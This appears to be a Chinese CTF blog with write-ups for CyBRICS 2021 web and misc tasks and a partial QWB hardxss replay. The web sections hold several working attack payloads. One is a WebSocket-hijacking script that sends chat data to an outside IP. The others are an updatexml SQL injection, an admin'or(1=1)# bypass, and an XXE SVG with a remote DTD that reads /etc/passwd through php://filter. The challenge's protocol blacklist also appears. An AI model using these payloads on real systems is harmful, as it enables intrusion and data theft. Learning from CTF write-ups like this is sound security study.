class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> conn;<br><span class="hljs-keyword">var</span> sended_message = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRandomInt</span>(<span class="hljs-params">min, max</span>) </span>&#123;<br>    min = <span class="hljs-built_in">Math</span>.ceil(min);<br>    max = <span class="hljs-built_in">Math</span>.floor(max);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * (max - min) + min); <span class="hljs-comment">//The maximum is exclusive and the minimum is inclusive</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">item</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> escaped = $(<span class="hljs-string">&quot;&lt;div&gt;&quot;</span>).text(item).html();<br>    <span class="hljs-keyword">if</span> (item === sended_message) &#123;<br>        log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-right pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&lt;div class=&quot;font-weight-bold mb-1&quot;&gt;You&lt;/div&gt;&#x27;</span> +<br>            escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;<br>        sended_message = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-left pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&#x27;</span> +<br>            escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>    log.scrollTop = log.scrollHeight;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">let</span> room = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value;<br>    <span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&#x27;room=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(room);<br>    $(<span class="hljs-string">&quot;form input&quot;</span>).prop( <span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">false</span> );<br>    $(<span class="hljs-string">&quot;#room&quot;</span>).hide();<br>    $(<span class="hljs-string">&quot;#room&quot;</span>).parent().children().first().text(<span class="hljs-string">&quot;Room &quot;</span> + room);<br><br>    $(<span class="hljs-string">&quot;#connectButton&quot;</span>).hide();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>[<span class="hljs-string">&quot;WebSocket&quot;</span>]) &#123;<br>        conn = <span class="hljs-keyword">new</span> WebSocket(<span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);<br>        conn.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> item = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (evt.code === <span class="hljs-number">1003</span>) &#123;<br>                item = <span class="hljs-string">`Status: <span class="hljs-subst">$&#123;evt.reason&#125;</span>`</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                item = <span class="hljs-string">&quot;Connection closed.&quot;</span>;<br>            &#125;<br>            appendLog(item);<br>        &#125;;<br>        conn.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            appendLog(<span class="hljs-string">&quot;Connected&quot;</span>);<br>        &#125;;<br>        conn.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            appendLog(evt.data);<br>        &#125;;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        appendLog(<span class="hljs-string">&quot;Your browser does not support WebSockets.&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> room = getRandomInt(<span class="hljs-number">1000</span>, <span class="hljs-number">9999999999</span>);<br>    <span class="hljs-keyword">var</span> msg = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;msg&quot;</span>);<br>    <span class="hljs-keyword">var</span> log = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;log&quot;</span>);<br><br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;form&quot;</span>).onsubmit = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!conn) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!msg.value) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        conn.send(msg.value);<br>        sended_message = msg.value;<br>        msg.value = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br><br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value = room;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>大致过程就是 先生成了一个随机数当作房间号，然后实现了消息接收发送在前端的显示，然后实现了WebSocket连接来接受和发送消息。看题目意思最开始还觉得要找到秘密的房间号，但看到随机生成的范围就不太可能了。后面有大佬出了，看了下exp才知道咋做了。</p><p>因为题目还给了一个电话的按钮，可以访问url并且可以发送问题，按题目描述应该就是通过这个电话来伪造技术支持发送<code>Hey, i forgot the flag. Can you remind me?</code>来获取flag</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">msg</span>)</span>&#123;<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">`&lt;img src=http://39.107.239.30:80/a=<span class="hljs-subst">$&#123;<span class="hljs-built_in">escape</span>(msg)&#125;</span>&gt;&lt;/img&gt;`</span>);<br>   <span class="hljs-comment">//还可以const logger = (a) =&gt; &#123;</span><br>        <span class="hljs-comment">//fetch(`http://39.107.239.30:80/?q=$&#123;encodeURI(a)&#125;`);</span><br>        <span class="hljs-comment">// &#125;;</span><br>&#125;<br>ws = <span class="hljs-keyword">new</span> WebSocket ( <span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);<br>    ws.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> item = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (evt.code == <span class="hljs-number">1003</span>)&#123;<br>            item = <span class="hljs-string">`status: <span class="hljs-subst">$&#123;evt.reason&#125;</span>`</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            item = <span class="hljs-string">&quot;Connection closed.&quot;</span>;<br>        &#125;<br>        appendLog(item);<br>    &#125;;<br>ws.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>)</span>&#123;<br>        appendLog (<span class="hljs-string">&quot;Connected&quot;</span>);          <br>ws.send( <span class="hljs-string">&quot;Hey, i forgot the flag. Can you remind me?&quot;</span>);<br>    &#125;;<br>    ws.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>    appendLog(evt.data)<br>    &#125;;<br>&lt;/script&gt;<br><br></code></pre></div></td></tr></table></figure><p>然后在自己vps上挂上exp，用电话访问即可。</p><p><img src="https://img-blog.csdnimg.cn/12c3f57885114411bfe1c4bf702f5ce7.png" alt="在这里插入图片描述"></p><p>现在感觉对于一些漏洞的学习，还是得注重理解原理而不是仅仅把题做出来，回头再看CSRF得漏洞等，发现以前对它得理解还是太浅了，结合WebSocket现在感觉理解更深了，对于用户身份得伪造是一个核心问题，任何漏洞都有着核心的利用思想，这个思想也可以用到其他得地方，应该多注重这些思想得积累，以后在看到某些协议或者可利用漏洞时，应注重思考这些漏洞的思想在哪，融会贯通才是最重要的。</p><p>今天再接着看看强网杯hardxss的预期解。</p><h2 id="adnetwork"><a href="#adnetwork" class="headerlink" title="adnetwork"></a>adnetwork</h2><p>1337个重定向，直接脚本request一下就行，当时浏览器运气好都跑出来了。也就只会做这个题了。</p><h2 id="Announcemen"><a href="#Announcemen" class="headerlink" title="Announcemen"></a>Announcemen</h2><p>报错注入，抓包发现还要对email进行md5基本语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">#<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;announcement&#x27;</span><br><br> #<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span><br>table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;logs&#x27;</span><br><br> #&quot;&#x27; or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or&#x27;&quot;<br></code></pre></div></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>感觉misc也挺好玩的，没怎么了解misc，暑假趁着学学misc</p><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>前面几张图可以盲猜，到最后一张是一张二维码，需要分帧gif拼图，</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;640.gif&#x27;</span>)<br><span class="hljs-comment"># p = []</span><br><span class="hljs-comment"># for i in range(9,88,3):</span><br><span class="hljs-comment">#     p.append(i)</span><br>flag = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">1080</span>, <span class="hljs-number">1080</span>), <span class="hljs-string">&quot;#FFFFFF&quot;</span>)<br>p = [<span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">18</span>, <span class="hljs-number">21</span>, <span class="hljs-number">24</span>, <span class="hljs-number">27</span>, <span class="hljs-number">30</span>, <span class="hljs-number">33</span>, <span class="hljs-number">36</span>, <span class="hljs-number">39</span>, <span class="hljs-number">42</span>, <span class="hljs-number">45</span>, <span class="hljs-number">48</span>, <span class="hljs-number">51</span>, <span class="hljs-number">54</span>, <span class="hljs-number">57</span>, <span class="hljs-number">60</span>, <span class="hljs-number">63</span>, <span class="hljs-number">66</span>, <span class="hljs-number">69</span>, <span class="hljs-number">72</span>, <span class="hljs-number">75</span>, <span class="hljs-number">78</span>, <span class="hljs-number">81</span>, <span class="hljs-number">84</span>, <span class="hljs-number">87</span>]<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    demo = <span class="hljs-string">&#x27;demo/&#x27;</span> + <span class="hljs-string">&#x27;640-&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.png&#x27;</span><br>    frame = Image.<span class="hljs-built_in">open</span>(demo)<br>    box = (<span class="hljs-number">0</span>, <span class="hljs-number">496</span>, <span class="hljs-number">1080</span>, <span class="hljs-number">517</span>)<br>    re = frame.crop(box)<br>    flag.paste(re,(<span class="hljs-number">0</span>,c*<span class="hljs-number">21</span>))<br>    c+=<span class="hljs-number">1</span><br>flag.show()<br><br></code></pre></div></td></tr></table></figure><p>Image模块参考<a href="https://www.cnblogs.com/tomyyyyy/p/11122814.html#:~:text=Image%E6%A8%A1%E5%9D%97%E6%98%AF%E5%9C%A8Python,PIL%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%AF%B9%E5%9B%BE%E5%83%8F%E8%BF%9B%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E7%9A%84%E5%8A%9F%E8%83%BD%E5%9F%BA%E6%9C%AC%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%8E%E6%AD%A4%E6%A8%A1%E5%9D%97%E5%86%85%E3%80%82">https://www.cnblogs.com/tomyyyyy/p/11122814.html#:~:text=Image%E6%A8%A1%E5%9D%97%E6%98%AF%E5%9C%A8Python,PIL%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%AF%B9%E5%9B%BE%E5%83%8F%E8%BF%9B%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%E7%9A%84%E5%8A%9F%E8%83%BD%E5%9F%BA%E6%9C%AC%E9%83%BD%E5%8C%85%E5%90%AB%E4%BA%8E%E6%AD%A4%E6%A8%A1%E5%9D%97%E5%86%85%E3%80%82</a></p><h2 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h2><p>stegsolve打开左右调通道</p><p><img src="https://img-blog.csdnimg.cn/fabd3eaa5f5947538da8ade72471b3b8.png" alt="在这里插入图片描述"></p><p>慢慢试25次。</p><h2 id="Recording"><a href="#Recording" class="headerlink" title="Recording"></a>Recording</h2><p>看了wp，要用到MacroRecorder工具，做misc还是得搜索引擎用的好呀，百度还是不太行。可以查到mrf文件格式大致是一个画图用的，鼠标宏类似的，中间还整的有虚拟键盘，打印出来了一个网址，输进去要密码，但事件最后给了密码，输进去就出了。思路是这样，关键还是得找到那个工具，</p><h3 id="Namecheck"><a href="#Namecheck" class="headerlink" title="Namecheck"></a>Namecheck</h3><p>这题社工题了，看看wp就行了。。</p><h2 id="ASCII-Terminal"><a href="#ASCII-Terminal" class="headerlink" title="ASCII Terminal"></a>ASCII Terminal</h2><h2 id="LX-100"><a href="#LX-100" class="headerlink" title="LX-100"></a>LX-100</h2><p>打开流量，先看看常规的协议HTTP啥的</p><p><img src="https://img-blog.csdnimg.cn/d754955bca1a441a8ac7a7b50fae85bf.png" alt="在这里插入图片描述"></p><p>谷歌可以查到是Lumix GX80 摄像头，其视频流通过udp传输。把udp追踪流dump下来（原始数据）直接保存为<code>mjpeg</code>，<code>VLC media player</code>就能播放。</p><p>或者可以写脚本，原始数据有很多图片<code>FFD8</code>开头，将每张图提取出来。</p><h2 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h2><h2 id="Future-Tech"><a href="#Future-Tech" class="headerlink" title="Future Tech"></a>Future Tech</h2>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWB_Hardxss</title>
    <link href="/2021/07/23/2021-7-23-QWB_Hardxss%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/07/23/2021-7-23-QWB_Hardxss%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="QWB-Hardxss"><a href="#QWB-Hardxss" class="headerlink" title="QWB_Hardxss"></a>QWB_Hardxss</h1><p>这道题属实超出了自己的知识范围，很多东西不是很懂，前几天先把XML，DTD的基础知识看了下，再来看这题，但还是有些云里雾里，太菜了。</p><p>入手只有登录可以进去，简单测试了下，很明显发现一些注入关键词被过滤掉了，然后试试万能密码<code>admin&#39;or(1=1)#</code>抓包发现返回了cookie，但还是登陆不上。</p><p><img src="https://img-blog.csdnimg.cn/0e82937ad3d8403292b8208410f70390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在js中手动设置cookie,<code>document.cookie=&quot;PHPSESSID=utf3df914s2ira67rnoeifom10&quot;</code></p><p>登录成功后，可以看到一个上传界面</p><p><img src="https://img-blog.csdnimg.cn/60c4ef1ebc4443e4a7d0dce5ca7f0d85.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后就只能对着WP做了，因为自己还没接触过XXE注入。</p><p>根据登录界面的提示<code>外部引用</code>，<code>矢量图</code>，则可以想到使用svg来上传图片，进行XXE注入</p><p><img src="https://img-blog.csdnimg.cn/509ed1ee600344329a5a3ba36a62d433.png" alt="在这里插入图片描述"></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">secret</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://39.107.239.30:80/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">visit_hacker</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://39.107.239.30:80/xxe.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%visit_hacker;</span><br><span class="hljs-meta">%hacker;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hacker</span>&gt;</span><span class="hljs-symbol">&amp;sending;</span><span class="hljs-tag">&lt;/<span class="hljs-name">hacker</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>1.php中为</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd&quot;</span>;<br><br></code></pre></div></td></tr></table></figure><p>xxe.dtd中为</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">hacker</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY sending SYSTEM &#x27;%secret;&#x27;&gt;&quot;</span>&gt;</span> <br>这个地方最开始不小心在secret前面加了个/，一直没发现浪费了贼多时间<br></code></pre></div></td></tr></table></figure><p>不知道是不是buu环境的问题，上传的svg一直显示<code>Not Image!</code>。直接拿wp读取到的源码先看看吧。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-comment">// ini_set(&quot;display_errors&quot;,&quot;off&quot;);</span><br><span class="hljs-comment">// error_reporting(0);</span><br><span class="hljs-keyword">if</span>(!array_key_exists(<span class="hljs-string">&quot;login&quot;</span>,<span class="hljs-variable">$_SESSION</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login first&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;login&quot;</span>]===<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;login first&quot;</span>);<br>&#125;<br><span class="hljs-variable">$encode</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>];<br><span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$encode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)!=<span class="hljs-string">&quot;data:&quot;</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You!Hacker!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$decode</span>=file_get_contents(<span class="hljs-variable">$encode</span>);<br><span class="hljs-comment">// var_dump($decode);</span><br><span class="hljs-keyword">if</span>(!(substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;\xFF\xD8&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;BM&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)==<span class="hljs-string">&quot;\x89\x50&quot;</span> <span class="hljs-keyword">or</span> substr(<span class="hljs-variable">$decode</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)===<span class="hljs-string">&quot;GI&quot;</span>))&#123;<br>    <span class="hljs-comment">// libxml_disable_entity_loader(true);</span><br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$res</span>=<span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$decode</span>,LIBXML_DTDLOAD);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Image!&quot;</span>);<br>    <span class="hljs-variable">$decode1</span>=<span class="hljs-variable">$dom</span>-&gt;saveXML();<br>    <span class="hljs-comment">// highlight_string($deocde1);</span><br>    <span class="hljs-comment">//防止本地文件读取</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/file:|data:|zlib:|php:\/\/stdin|php:\/\/input|php:\/\/fd|php:\/\/memory|php:\/\/temp|expect:|ogg:|rar:|glob:|phar:|ftp:|ssh2:|bzip2:|zip:|ftps:/i&quot;</span>,<span class="hljs-variable">$decode1</span>,<span class="hljs-variable">$matches</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;unsupport protocol: &quot;</span>.<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\/var|\/etc|\.\.|\/proc/i&quot;</span>,<span class="hljs-variable">$decode1</span>,<span class="hljs-variable">$matches</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Illegal URI: &quot;</span>.<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>    <span class="hljs-variable">$res</span>=<span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$decode</span>,LIBXML_NOENT);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not Image!&quot;</span>);<br>    <span class="hljs-variable">$decode</span>=<span class="hljs-variable">$dom</span>-&gt;saveXML();<br>    <br>    <span class="hljs-comment">// highlight_string($decode);</span><br>    <span class="hljs-comment">//防止xss</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/script|object|embed|onload\s*=/i&quot;</span>,<span class="hljs-variable">$decode</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no script!&quot;</span>);<br>    <span class="hljs-comment">// $encode=&quot;data:image/svg+xml;base64,&quot;.base64_encode($decode);</span><br>&#125;<br><span class="hljs-variable">$filename</span>=md5(rand());<br>file_put_contents(<span class="hljs-string">&quot;../upload/&quot;</span>.<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$decode</span>);<br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/upload/&#x27;</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$con</span>=<span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-string">&quot;ctf&quot;</span>);<br><span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;select img from avatar where userid=<span class="hljs-subst">$_SESSION</span>[login]&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;<br>    <span 